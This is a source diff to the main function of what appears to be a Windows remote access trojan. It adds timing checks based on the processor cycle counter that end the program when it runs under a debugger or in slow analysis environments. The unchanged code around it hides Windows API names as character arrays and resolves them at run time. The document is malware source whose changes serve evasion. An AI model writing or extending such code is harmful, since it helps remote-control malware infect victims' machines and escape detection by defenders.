@@ -439,6 +439,13 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+#if !DEBUG	
+	unsigned __int64 cycleCountDiff;
+	unsigned __int64 cycleCountStart;
+
+	cycleCountStart = __rdtsc();
+#endif	
+	
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	
@@ -498,9 +505,19 @@ WinMain(HINSTANCE hInstance,
 
 	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
 	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);
+
+#if !DEBUG	
+	cycleCountDiff = __rdtsc() - cycleCountStart;		
+	if ( cycleCountDiff >= 1000000000 )
+		return 1;
+#endif	
 	
 	for(;;)
 	{
+#if !DEBUG		
+		cycleCountStart = __rdtsc();
+#endif		
+		
 		WSADATA wsaData;
 
 		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
@@ -573,6 +590,12 @@ WinMain(HINSTANCE hInstance,
 			
 			Sleep(10000);
 		}
+
+#if !DEBUG		
+		cycleCountDiff = __rdtsc() - cycleCountStart;		
+		if ( cycleCountDiff >= 1000000000 )
+			return 1;
+#endif		
 	}
 
 	char ca_login[] = { 'l','o','g','i','n',0 };
@@ -604,6 +627,9 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA("Error receiving message.");
 #endif			
 		}
+#if !DEBUG		
+		cycleCountStart = __rdtsc();
+#endif		
 
 		EncryptDecryptString(recvBuffer, SOCKET_BUFFER_SIZE);
 
@@ -653,6 +679,17 @@ WinMain(HINSTANCE hInstance,
 			break;
 		}
 		OutputDebugStringA("\n");
+
+#if !DEBUG
+		cycleCountDiff = __rdtsc() - cycleCountStart;		
+		if ( cycleCountDiff >= 1000000000 )
+			return 1;
+		
+		// char buffer[256];
+		// sprintf_s(buffer, "%I64d\n", cycleCountDiff);
+		// OutputDebugStringA(buffer);
+#endif		
+		
 		Sleep(3000);
 	}
 
